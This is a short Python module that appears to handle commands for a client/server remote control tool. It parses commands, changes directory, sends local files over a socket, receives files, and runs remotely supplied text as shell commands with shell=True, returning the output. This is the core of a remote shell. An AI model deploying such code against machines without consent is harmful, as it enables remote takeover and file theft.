import socket
import re
import os
import subprocess
import communication as comm


def extract_command(command: str) -> tuple[str, tuple[str, ...]]:
    func = command.split(" ")[0]
    args: tuple[str] = tuple(re.findall(r"\[(.*?)\]", command))

    return func, args


def cd(args: tuple[str, ...]):
    os.chdir(args[0])


def upload_file(s: socket.socket, args: tuple[str, ...]):
    f = open(args[0], "rb")
    s.send(f.read())
    f.close()


def download_file(s: socket.socket, args: tuple[str, ...], bufsize=1024 * 1024):
    f = open(args[1], "wb")
    s.settimeout(1)
    chunk = s.recv(bufsize)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(bufsize)
        except socket.timeout:
            break
    s.settimeout(None)
    f.close()


def exec_command(s: socket.socket, args: tuple[str, ...]):
    execute = subprocess.Popen(
        " ".join(args),
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
    )
    if execute.stdout and execute.stderr:
        result = execute.stdout.read() + execute.stderr.read()
        comm.send(s, result.decode())
    else:
        comm.send(s, "[cmd:exec] invalid result")


# Server commands


def recv_exec_command(s: socket.socket):
    print("[cmd:exec]", comm.receive(s))
